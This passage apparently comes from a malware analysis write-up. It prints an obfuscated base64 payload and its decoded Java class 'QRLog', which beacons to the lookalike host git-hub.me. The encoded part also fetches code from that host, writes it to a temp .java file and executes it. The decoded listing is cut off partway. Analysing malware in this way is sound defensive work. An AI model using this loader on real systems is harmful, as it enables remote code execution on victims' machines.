+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;nQ7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBSZXF1ZXN0OwppbXBvcnQgamF2YS5uZXQuaHR0cC5IdHRwUmVzcG9uc2U7CmltcG9ydCBqYXZhLm5pby5jaGFyc2V0LlN0YW5&quot;</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;kYXJkQ2hhcnNldHM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS51dGlsLlJhbmRvbTsKaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7CmltcG9yd&quot;</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CBqYXZhLmlvLkZpbGU7CmltcG9ydCBqYXZhLmlvLkZpbGVXcml0ZXI7CmltcG9ydCBqYXZhLmxhbmcuVGhyZWFkOwoKcHVibGljIGNsYXNzIFFSTG9nIHsKCiAgICBwcml2YXR&quot;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;lIHN0YXRpYyBmaW5hbCBTdHJpbmcgUE9TVF9VUkwgPSAiaHR0cHM6Ly93d3cuZ2l0LWh1Yi5tZS92aWV3LnBocCI7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3Rya&quot;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;W5nW10gYXJncykgdGhyb3dzIElPRXhjZXB0aW9uewoKICAgICAgICBzZW5kUE9TVCgpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFN0cmluZyByYW5kR2VuKCkgdGhyb3d&quot;</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;zIElPRXhjZXB0aW9uIHsKICAgICAgICBTdHJpbmcgc3RyUG9vbCA9ICIxMjM0NTY3ODkiOwogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpO&quot;</span></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;wogICAgICAgIFJhbmRvbSByYW5kID0gbmV3IFJhbmRvbSgpOwogICAgICAgIAogICAgICAgIGZvciAoaW50IGk9MDsgaTw4OyBpKyspewogICAgICAgICAgICBzYi5hcHBlbmQ&quot;</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;oc3RyUG9vbC5jaGFyQXQocmFuZC5uZXh0SW50KHN0clBvb2wubGVuZ3RoKCkpKSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBzYi50b1N0cmluZygpOwogI&quot;</span></span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgfQogICAgCiAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgZ2V0T3BlcmF0aW5nU3lzdGVtKCkgewogICAgICAgIFN0cmluZyBvcyA9IFN5c3RlbS5nZXRQcm9wZXJ0eSgib3M&quot;</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ubmFtZSIpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBudWxsOwogICAgICAgIAogICAgICAgIGlmIChvcy5jb250YWlucygiV2luZG93cyIpKQogICAgICAgICAgICByZXN1b&quot;</span></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;HQgPSAiMCI7CiAgICAgICAgZWxzZSBpZiAob3MuY29udGFpbnMoIkxpbnV4IikpCiAgICAgICAgICAgIHJlc3VsdCA9ICIyIjsKICAgICAgICBlbHNlIGlmIChvcy5jb250YWl&quot;</span></span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ucygiTWFjIE9TIFgiKSkKICAgICAgICAgICAgcmVzdWx0ID0gIjEiOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICAKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgc&quot;</span></span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;2VuZFBPU1QoKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgIFN0cmluZyB1aWQgPSByYW5kR2VuKCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBkYXRhID0gbmV3IFN0cml&quot;</span></span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uZ0J1aWxkZXIoKTsKICAgICAgICBTdHJpbmcgc2VjX3BhdGggPSAiIjsKICAgICAgICBkYXRhLmFwcGVuZCgiR0lUSFVCX1JFUSIpOwogICAgICAgIGRhdGEuYXBwZW5kKHVpZ&quot;</span></span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;Ck7CiAgICAgICAgZGF0YS5hcHBlbmQoIjIwMDAiKTsKICAgICAgICBkYXRhLmFwcGVuZChnZXRPcGVyYXRpbmdTeXN0ZW0oKSk7CiAgICAgICAgCiAgICAgICAgd2hpbGUgKHR&quot;</span></span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ydWUpCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKHNlY19wYXRoLmxlbmd0aCgpID4gMSkgewogICAgICAgICAgICAgICAgICAgIEZpb&quot;</span></span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;GUgc2VjRmlsZSA9IG5ldyBGaWxlKHNlY19wYXRoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc2VjRmlsZS5leGlzdHMoKSkKICAgICAgICAgICAgICAgICAgICAgICAgU3l&quot;</span></span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;zdGVtLmV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEh0dHBSZXF1ZXN0IHJlcXVlc3QgPSBIdHRwUmVxdWVzdC5uZ&quot;</span></span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;XdCdWlsZGVyKCkKICAgICAgICAgICAgICAgICAgICAuaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIpCiAgICAgICAgICA&quot;</span></span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gICAgICAgICAgLnZlcnNpb24oSHR0cENsaWVudC5WZXJzaW9uLkhUVFBfMV8xKQogICAgICAgICAgICAgICAgICAgIC51cmkoVVJJLmNyZWF0ZShQT1NUX1VSTCkpCiAgICAgI&quot;</span></span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICAgICAgICAgLlBPU1QoSHR0cFJlcXVlc3QuQm9keVB1Ymxpc2hlcnMub2ZTdHJpbmcoZGF0YS50b1N0cmluZygpKSkKICAgICAgICAgICAgICAgICAgICAuYnVpbGQ&quot;</span></span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;oKTsKICAgICAgICAgICAgICAgIEh0dHBDbGllbnQgY2xpZW50ID0gSHR0cENsaWVudC5uZXdIdHRwQ2xpZW50KCk7CiAgICAgICAgICAgICAgICBIdHRwUmVzcG9uc2U8U3Rya&quot;</span></span>
+<span id="cb21-24"><a href="#cb21-24" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;W5nPiByZXNwb25zZSA9IGNsaWVudC5zZW5kKHJlcXVlc3QsIEh0dHBSZXNwb25zZS5Cb2R5SGFuZGxlcnMub2ZTdHJpbmcoKSk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9&quot;</span></span>
+<span id="cb21-25"><a href="#cb21-25" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uc2Uuc3RhdHVzQ29kZSgpICE9IDIwMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTAwMCk7CiAgICAgICAgICAgICAgICAgI&quot;</span></span>
+<span id="cb21-26"><a href="#cb21-26" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTdHJpbmcgcmVzU3RyID0gcmVzcG9uc2UuYm9keSgpOwogICAgICAgICAgICAgICAgaWYgKCF&quot;</span></span>
+<span id="cb21-27"><a href="#cb21-27" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;yZXNTdHIuc3RhcnRzV2l0aCgiR0lUSFVCX1JFUyIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGF0YSBFcnJvc&quot;</span></span>
+<span id="cb21-28"><a href="#cb21-28" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;iIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXNTdHIubGVuZ3RoKCkgPiAxMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICA&quot;</span></span>
+<span id="cb21-29"><a href="#cb21-29" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gICAgICAgICBTdHJpbmcgZW5jX2RhdGEgPSByZXNTdHIuc3Vic3RyaW5nKDEwKTsKICAgICAgICAgICAgICAgICAgICBieXRlIFtdIGRlY19kYXRhID0gQmFzZTY0LmdldERlY&quot;</span></span>
+<span id="cb21-30"><a href="#cb21-30" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;29kZXIoKS5kZWNvZGUoZW5jX2RhdGEpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfZmlsZSA9IG5ldyBTdHJpbmcoZGVjX2RhdGEsIFN0YW5kYXJkQ2hhcnNldHM&quot;</span></span>
+<span id="cb21-31"><a href="#cb21-31" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;uVVRGXzgpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfcGF0aDsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoSW50ZWdlci5wY&quot;</span></span>
+<span id="cb21-32"><a href="#cb21-32" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;XJzZUludChnZXRPcGVyYXRpbmdTeXN0ZW0oKSkgPT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9yZ19wYXRoID0gU3lzdGVtLmd&quot;</span></span>
+<span id="cb21-33"><a href="#cb21-33" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;ldFByb3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIlxccHJlZlRtcC5qYXZhIjsKICAgICAgICAgICAgICAgICAgICAgICAgc2VjX3BhdGggPSBTeXN0ZW0uZ2V0UHJvcGVyd&quot;</span></span>
+<span id="cb21-34"><a href="#cb21-34" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;HkoImphdmEuaW8udG1wZGlyIikgKyAiXFxwLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3JnX3BhdGggPSBTeXN&quot;</span></span>
+<span id="cb21-35"><a href="#cb21-35" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;0ZW0uZ2V0UHJvcGVydHkoImphdmEuaW8udG1wZGlyIikgKyAiL3ByZWZUbXAuamF2YSI7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlY19wYXRoID0gU3lzdGVtLmdldFByb&quot;</span></span>
+<span id="cb21-36"><a href="#cb21-36" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIi9wLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHRyeSAoRmlsZVdyaXRlciBmaWxlID0&quot;</span></span>
+<span id="cb21-37"><a href="#cb21-37" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;gbmV3IEZpbGVXcml0ZXIob3JnX3BhdGgsIHRydWUpO0J1ZmZlcmVkV3JpdGVyIGJ1ZmZlciA9IG5ldyBCdWZmZXJlZFdyaXRlcihmaWxlKSkgewogICAgICAgICAgICAgICAgI&quot;</span></span>
+<span id="cb21-38"><a href="#cb21-38" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICBidWZmZXIud3JpdGUob3JnX2ZpbGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgY21kbGluZSA9ICJqYXZhICIgKyB&quot;</span></span>
+<span id="cb21-39"><a href="#cb21-39" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;vcmdfcGF0aCArICIgIiArIHVpZCArICIgIiArIFBPU1RfVVJMOwogICAgICAgICAgICAgICAgICAgIFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kbGluZSk7CiAgICAgI&quot;</span></span>
+<span id="cb21-40"><a href="#cb21-40" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;CAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDMwMDApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDUwMDApOwogICAgICAgICAgICB&quot;</span></span>
+<span id="cb21-41"><a href="#cb21-41" aria-hidden="true" tabindex="-1"></a>          <span class="op">+</span> <span class="st">&quot;9CiAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K&quot;</span><span class="op">;</span></span></code></pre></div>
+<p>As it was commented, it is <code>base64</code> content which will be
+decoded and later written in a <code>.java</code> file located in a
+temporary directory.</p>
+<p>Decoding the base64 content of this variable we get the following
+output, which is far from being a simple log file:</p>
+<details>
+<summary>
+Java Code (112 lines)
+</summary>
+<div class="sourceCode" id="cb22"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">IOException</span><span class="op">;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">URI</span><span class="op">;</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpClient</span><span class="op">;</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpRequest</span><span class="op">;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">net</span><span class="op">.</span><span class="im">http</span><span class="op">.</span><span class="im">HttpResponse</span><span class="op">;</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">nio</span><span class="op">.</span><span class="im">charset</span><span class="op">.</span><span class="im">StandardCharsets</span><span class="op">;</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Base64</span><span class="op">;</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">util</span><span class="op">.</span><span class="im">Random</span><span class="op">;</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">BufferedWriter</span><span class="op">;</span></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">File</span><span class="op">;</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">io</span><span class="op">.</span><span class="im">FileWriter</span><span class="op">;</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="im">java</span><span class="op">.</span><span class="im">lang</span><span class="op">.</span><span class="im">Thread</span><span class="op">;</span></span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> QRLog <span class="op">{</span></span>
+<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="bu">String</span> POST_URL <span class="op">=</span> <span class="st">&quot;https://www.git-hub.me/view.php&quot;</span><span class="op">;</span></span>
+<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">main</span><span class="op">(</span><span class="bu">String</span><span class="op">[]</span> args<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span><span class="op">{</span></span>
+<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a>        <span class="fu">sendPOST</span><span class="op">();</span></span>
+<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">randGen</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> strPool <span class="op">=</span> <span class="st">&quot;123456789&quot;</span><span class="op">;</span></span>
+<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Random</span> rand <span class="op">=</span> <span class="kw">new</span> <span class="bu">Random</span><span class="op">();</span></span>
+<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span> i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span> i<span class="op">++){</span></span>
+<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a>            sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">charAt</span><span class="op">(</span>rand<span class="op">.</span><span class="fu">nextInt</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">length</span><span class="op">())));</span></span>
+<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">();</span></span>
+<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getOperatingSystem</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> result <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;0&quot;</span><span class="op">;</span></span>
+<span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Linux&quot;</span><span class="op">))</span></span>
+<span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;2&quot;</span><span class="op">;</span></span>
+<span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Mac OS X&quot;</span><span class="op">))</span></span>
+<span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a>            result <span class="op">=</span> <span class="st">&quot;1&quot;</span><span class="op">;</span></span>
+<span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">sendPOST</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> uid <span class="op">=</span> <span class="fu">randGen</span><span class="op">();</span></span>
+<span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> data <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb22-51"><a href="#cb22-51" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> sec_path <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb22-52"><a href="#cb22-52" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;GITHUB_REQ&quot;</span><span class="op">);</span></span>
+<span id="cb22-53"><a href="#cb22-53" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uid<span class="op">);</span></span>
+<span id="cb22-54"><a href="#cb22-54" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;2000&quot;</span><span class="op">);</span></span>
+<span id="cb22-55"><a href="#cb22-55" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">());</span></span>
+<span id="cb22-56"><a href="#cb22-56" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb22-57"><a href="#cb22-57" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="op">(</span><span class="kw">true</span><span class="op">)</span></span>
+<span id="cb22-58"><a href="#cb22-58" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
+<span id="cb22-59"><a href="#cb22-59" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb22-60"><a href="#cb22-60" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>sec_path<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb22-61"><a href="#cb22-61" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">File</span> secFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>sec_path<span class="op">);</span></span>
+<span id="cb22-62"><a href="#cb22-62" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span>secFile<span class="op">.</span><span class="fu">exists</span><span class="op">())</span></span>
+<span id="cb22-63"><a href="#cb22-63" aria-hidden="true" tabindex="-1"></a>                        <span class="bu">System</span><span class="op">.</span><span class="fu">exit</span><span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb22-64"><a href="#cb22-64" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb22-65"><a href="#cb22-65" aria-hidden="true" tabindex="-1"></a>                </span>
+<span id="cb22-66"><a href="#cb22-66" aria-hidden="true" tabindex="-1"></a>                HttpRequest request <span class="op">=</span> HttpRequest<span class="op">.</span><span class="fu">newBuilder</span><span class="op">()</span></span>
+<span id="cb22-67"><a href="#cb22-67" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">header</span><span class="op">(</span><span class="st">&quot;Content-Type&quot;</span><span class="op">,</span> <span class="st">&quot;application/json; charset=utf-8&quot;</span><span class="op">)</span></span>
+<span id="cb22-68"><a href="#cb22-68" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">version</span><span class="op">(</span>HttpClient<span class="op">.</span><span class="fu">Version</span><span class="op">.</span><span class="fu">HTTP_1_1</span><span class="op">)</span></span>
+<span id="cb22-69"><a href="#cb22-69" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">uri</span><span class="op">(</span><span class="bu">URI</span><span class="op">.</span><span class="fu">create</span><span class="op">(</span>POST_URL<span class="op">))</span></span>
+<span id="cb22-70"><a href="#cb22-70" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">POST</span><span class="op">(</span>HttpRequest<span class="op">.</span><span class="fu">BodyPublishers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">(</span>data<span class="op">.</span><span class="fu">toString</span><span class="op">()))</span></span>
+<span id="cb22-71"><a href="#cb22-71" aria-hidden="true" tabindex="-1"></a>                    <span class="op">.</span><span class="fu">build</span><span class="op">();</span></span>
+<span id="cb22-72"><a href="#cb22-72" aria-hidden="true" tabindex="-1"></a>                HttpClient client <span class="op">=</span> HttpClient<span class="op">.</span><span class="fu">newHttpClient</span><span class="op">();</span></span>
